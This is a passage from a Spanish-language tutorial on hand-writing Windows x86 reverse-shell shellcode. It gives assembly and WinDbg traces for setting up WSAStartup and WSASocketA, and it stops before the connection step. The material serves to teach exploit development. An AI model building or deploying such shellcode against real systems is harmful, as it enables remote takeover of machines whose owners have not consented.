<h3 id="llamada-a-wsastartup">LLamada a WSAStartup<a class="zola-anchor" href="#llamada-a-wsastartup" aria-label="Anchor link for: llamada-a-wsastartup" style="visibility: hidden;"></a>
</h3>
<p>Como se mencionó anteriormente, la primera API que debemos llamar es WSAStartup para que nuestro shellcode inicie el uso de la DLL de <strong>Winsock</strong> . Analicemos el prototipo de la función:</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++">
</span><span class="z-source z-c++"><span class="z-storage z-type z-c">int</span> <span class="z-meta z-function z-c++"><span class="z-meta z-toc-list z-full-identifier z-c++"><span class="z-entity z-name z-function z-c++">WSAStartup</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-begin z-c++">(</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-support z-type z-windows z-c">WORD</span> <span class="z-variable z-parameter z-c++">wVersionRequired</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">LPWSADATA lpWSAData
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-end z-c++">)</span></span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span><span class="z-source z-c++">
</span></code></pre>
<p>El primer parámetro parece ser la versión de la especificación de Windows Sockets. Lo estableceremos en "2.2".</p>
<p>Podemos obtener más información sobre otras versiones disponibles en la documentación oficial. El segundo parámetro es un puntero a la estructura <code>WSADATA</code> . Según Microsoft, esta estructura recibirá información sobre la implementación de Windows Sockets.</p>
<p>Necesitamos reservar espacio para esta estructura, así que determinemos su longitud revisando su prototipo e inspeccionando el tamaño de cada miembro.</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++"><span class="z-storage z-type z-c++">typedef</span> <span class="z-storage z-type z-c++">struct</span> WSAData <span class="z-meta z-block z-c++"><span class="z-punctuation z-section z-block z-begin z-c++">{</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">WORD</span> wVersion<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">WORD</span> wHighVersion<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#if</span> ...
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">unsigned</span> <span class="z-storage z-type z-c">short</span> iMaxSockets<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#if</span> ...
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">unsigned</span> <span class="z-storage z-type z-c">short</span> iMaxUdpDg<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#if</span> ...
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span>lpVendorInfo<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#if</span> ...
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">char</span> szDescription<span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span>WSADESCRIPTION_LEN <span class="z-keyword z-operator z-arithmetic z-c">+</span> <span class="z-constant z-numeric z-integer z-decimal z-c++">1</span><span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#if</span> ...
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">char</span> szSystemStatus<span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span>WSASYS_STATUS_LEN <span class="z-keyword z-operator z-arithmetic z-c">+</span> <span class="z-constant z-numeric z-integer z-decimal z-c++">1</span><span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#else</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">char</span> szDescription<span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span>WSADESCRIPTION_LEN <span class="z-keyword z-operator z-arithmetic z-c">+</span> <span class="z-constant z-numeric z-integer z-decimal z-c++">1</span><span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#endif</span></span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#else</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">char</span> szSystemStatus<span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span>WSASYS_STATUS_LEN <span class="z-keyword z-operator z-arithmetic z-c">+</span> <span class="z-constant z-numeric z-integer z-decimal z-c++">1</span><span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#endif</span></span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#else</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">unsigned</span> <span class="z-storage z-type z-c">short</span> iMaxSockets<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#endif</span></span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#else</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">unsigned</span> <span class="z-storage z-type z-c">short</span> iMaxUdpDg<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#endif</span></span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#else</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span>lpVendorInfo<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#endif</span></span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-punctuation z-section z-block z-end z-c++">}</span></span> <span class="z-entity z-name z-type z-typedef z-c++">WSADATA</span><span class="z-punctuation z-terminator z-c++">;</span>
</span></code></pre>
<p>Al revisar la definición de la estructura y la información en el sitio web de Microsoft, observamos que algunos de los miembros ya no se utilizan si la versión es superior a “2.0”.</p>
<p>Si bien la mayoría de los campos tienen longitudes definidas, hay un par que siguen siendo problemáticos, como los campos <code>szDescription</code> y <code>szSystemStatus</code> .</p>
<p>Según la documentación oficial, <code>szDescription</code> puede tener una longitud máxima de 257 (<code>WSADESCRIPTION_LEN</code>, que es 256 más el terminador de cadena nula).</p>
<p>Sin embargo, no se menciona la longitud de <code>szSystemStatus</code>.Hay dos maneras de determinar la longitud de este campo. Podríamos codificar el socket en C y luego inspeccionar la estructura dentro de WinDbg, o podríamos usar recursos en línea para determinar el tamaño de este campo. Uno de los recursos más confiables para obtener esta información es el código fuente de <strong>ReactOS</strong>.</p>
<p><em>ReactOS es un sistema operativo de código abierto diseñado para ejecutar software y controladores de Windows.</em></p>
<p>El código fuente de ReactOS nos dice que la longitud máxima del campo szSystemStatus es 129 (<code>WSASYS_STATUS_LEN</code>, que es 128 más el terminador nulo).</p>
<p>Aunque desconocemos el tamaño exacto de la estructura, sabemos que solo estos dos campos (<code>szDescription</code> y <code>szSystemStatus</code>) pueden ocupar un máximo de <code>0x182</code> bytes. Considerando los demás campos de la estructura, que tienen tamaños definidos, podemos calcular la longitud máxima de la estructura usando WinDbg:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; ? 0x2 + 0x2 + 0x2 + 0x2 + 0x4 + 0n256 + 0n1 + 0n128 + 0n1
</span><span class="z-text z-plain">Evaluate expression: 398 = 0000018e
</span></code></pre>
<p>Debido a que el tamaño de esta estructura es mayor que el espacio que actualmente reservamos en la pila como parte de la función de inicio , necesitamos modificar nuestro shellcode y restar un valor más alto de ESP para tener en cuenta el tamaño de la estructura.</p>
<p>Después de repasar los argumentos que necesitamos proporcionar a la API WSAStartup y determinar el tamaño de la estructura que utiliza, actualicemos nuestro shellcode e intentemos llamarlo.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-comment z-block z-documentation z-python"><span class="z-punctuation z-definition z-comment z-begin z-python">&#39;&#39;&#39;</span>
</span></span><span class="z-source z-python"><span class="z-comment z-block z-documentation z-python">0:004&gt; ? 0xfffff9f0
</span></span><span class="z-source z-python"><span class="z-comment z-block z-documentation z-python">Evaluate expression: -1552 = fffff9f0
</span></span><span class="z-source z-python"><span class="z-comment z-block z-documentation z-python"><span class="z-punctuation z-definition z-comment z-end z-python">&#39;&#39;&#39;</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">start:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">int3;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ebp, esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                 
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add esp, 0xfffff9f0;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>     
</span></code></pre>
<p>Llamada a <code>WSAStartup</code>:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call_wsastartup:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov eax, esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve ESP a EAX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov cx, 0x590;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                 <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve 0x590 a CX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">sub eax, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Resta CX de EAX para evitar sobrescribir despues
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpWSAData
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor eax, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ax, 0x0202;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> mueve la version to AX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Insertar wVersionRequired
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x20];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamar WSAStartup
</span></span></code></pre>
<p>La función <code>call_wsastartup</code> que se muestra en el snippet anterior comienza moviendo la dirección de memoria de ESP, que usamos como ubicación de almacenamiento para nuestros símbolos resueltos, al registro EAX.</p>
<p>A continuación, encontramos una instrucción MOV que almacena el valor 0x590 en el registro CX. Después, encontramos una instrucción SUB que resta el valor de ECX (0x590) de EAX.</p>
<p>Como parte de la llamada a WSAStartup, la API rellenará la estructura WSADATA que se encuentra actualmente en la pila. Por ello, debemos asegurarnos de que las instrucciones posteriores del shellcode no sobrescriban el contenido de esta estructura.</p>
<p>Una forma de lograrlo es restar un valor arbitrario (<code>0x590</code>) del puntero de la pila y usarlo como almacenamiento para la estructura.</p>
<p>Tras la operación SUB, insertaremos EAX en la pila. La siguiente instrucción XOR pondrá a cero EAX y moveremos el valor 0x0202 al registro AX para que actúe como argumento <code>wVersionRequired</code>.</p>
<p>Finalmente, podemos enviar este argumento a la pila y llamar a <code>WSAStartup</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=00000202 ebx=77350000 ecx=00000590 edx=00d90000 esi=029b0030 edi=00d923e8
</span><span class="z-text z-plain">eip=029b00d2 esp=02baf438 ebp=02bafa6c iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">029b00d2 ff5520          call    dword ptr [ebp+20h]  ss:0023:02bafa8c={WS2_32!WSAStartup (77359cc0)}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; dds esp l2
</span><span class="z-text z-plain">02baf438  00000202
</span><span class="z-text z-plain">02baf43c  02baeeb0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=00000000 ebx=77350000 ecx=31ea8e31 edx=00000202 esi=029b0030 edi=00d923e8
</span><span class="z-text z-plain">eip=029b00d5 esp=02baf440 ebp=02bafa6c iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">029b00d5 0000            add     byte ptr [eax],al          ds:0023:00000000=??
</span></code></pre>
<p>Como podemos ver en el snippet anterior, el código de salida en EAX es 0, lo que confirma que ha tenido éxito.</p>
<h3 id="llamada-a-wsasocketa">LLamada a WSASocketA<a class="zola-anchor" href="#llamada-a-wsasocketa" aria-label="Anchor link for: llamada-a-wsasocketa" style="visibility: hidden;"></a>
</h3>
<p>Ahora necesitamos invocar a la api <code>WSASocketA</code>, la estructura es la siguiente:</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++">SOCKET WSAAPI <span class="z-meta z-function z-c++"><span class="z-meta z-toc-list z-full-identifier z-c++"><span class="z-entity z-name z-function z-c++">WSASocketA</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-begin z-c++">(</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-storage z-type z-c">int</span>                 <span class="z-variable z-parameter z-c++">af</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-storage z-type z-c">int</span>                 <span class="z-variable z-parameter z-c++">type</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-storage z-type z-c">int</span>                 <span class="z-variable z-parameter z-c++">protocol</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPWSAPROTOCOL_INFOA <span class="z-variable z-parameter z-c++">lpProtocolInfo</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    GROUP               <span class="z-variable z-parameter z-c++">g</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>               dwFlags
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-end z-c++">)</span></span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></code></pre>
<p>El prototipo de la función revela que hay 6 argumentos necesarios para la llamada.</p>
<p>La mayoría de estos argumentos tienen tipos de datos familiares como INT y DWORD, pero también encontraremos algunos tipos de datos extraños dentro de los parámetros <code>lpProtocolInfo</code> y <code>g</code> que requieren una revisión adicional.</p>
<p>Comenzemos con el parámetro <code>af</code> que corresponde a la familia de direcciones que utiliza el socket, al explorar la documentación, vemos que corresponde a la familia de direcciones IPv4, que es la que se utilizará para nuestro shell inverso.</p>
<p>EL siguiente es <code>type</code>, el cuál definirá el tipo de socket. Nuestro shell inverso, utilizará el protocolo TCP por lo tanto debemos proporcionar como argumentos SOCK_STREAM.</p>
<p>Según la documentación oficial, el parámetro de protocolo se basa en los dos argumentos anteriores proporcionados a la función.</p>
<p>En nuestro caso, debe establecerse en IPPROTO_TCP.</p>
<p>Siguiendo con la revisión de la documentación oficial, el parámetro <code>lpProtocolInfo</code> parece requerir un puntero a la estructura <code>WSAPROTOCOL_INFO</code> . Antes de profundizar en esta estructura, es importante tener en cuenta que este parámetro puede establecerse en nulo (0x0). Si se establece en nulo, Winsock usará los primeros 249 que coincidan con nuestros otros parámetros.</p>
<p>Dado que utilizamos el proveedor de servicios de transporte, protocolos estándar en nuestro shell inverso (TCP/IP), no deberíamos encontrar ningún problema si tenemos este parámetro en nulo.</p>
<p>A continuación, tenemos el parámetro <code>g</code>, este parámetro se utiliza para especificar el ID de un grupo de sockets, también puede establecer en nulo.</p>
<p>Finalmente, llegamos al parámetro dwFlags , que se utiliza para especificar atributos de socket adicionales. Como no requerimos ningún atributo adicional para nuestro shellcode actual, también estableceremos este valor en nulo.</p>
<p>La función quedaría de la siguiente manera:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call_wsasocketa:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor eax, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>              <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwFlags
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta g
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpProtocolInfo
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov al, 0x06;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>              <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> mueve AL, IPPROTO_TCP
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta protocol
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">sub al, 0x05;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>              <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Resta 0x05 de AL, AL = 0x01
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta type
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">inc eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                   <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Incrementa eax, EAX = 0x02
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta af
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x24];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamar a WSASocketA
</span></span></code></pre>
<p>En el snippet anterior, pondemos eax como nulo y los empujamos tres veces a la pila con los parámetros mencionados anteriormente ya que están configurados como nulos.</p>
<p>Luego movemos <code>0x06</code> a AL que es el valor de <code>IPPROTO_TCP</code> y despues se inserta en la pila con la instrucción de <code>push eax</code>.</p>
<p>Después resta <code>0x05</code> de AL que da como resultado a AL = <code>0x01</code> coincidiendo con el valor de SOCK_STREAM, despues lo insertamos en la pila.</p>
<p>Después eax se incrementa en uno que es valor necesario para insertar <code>af</code> en la pila.</p>
<p>Por último guarda <code>WSASocketA</code> en el desplazamiento <code>ebp+0x24</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; bp 013300e2
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=00000002 ebx=76760000 ecx=0e9f4d39 edx=00000202 esi=01330030 edi=013523e8
</span><span class="z-text z-plain">eip=013300e2 esp=030ff2a0 ebp=030ff8e4 iopl=0         nv up ei pl nz na po nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class="z-text z-plain">013300e2 ff5524          call    dword ptr [ebp+24h]  ss:0023:030ff908=00000000
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; dds @esp l6
</span><span class="z-text z-plain">030ff2a0  00000002
</span><span class="z-text z-plain">030ff2a4  00000001
</span><span class="z-text z-plain">030ff2a8  00000006
</span><span class="z-text z-plain">030ff2ac  00000000
</span><span class="z-text z-plain">030ff2b0  00000000
</span><span class="z-text z-plain">030ff2b4  00000000
</span></code></pre>
<p>Como se puede apreciar en el volcado de WinDBG, vemos como los valores están colocados en esp, que son los que hemos definido anteriormente.</p>
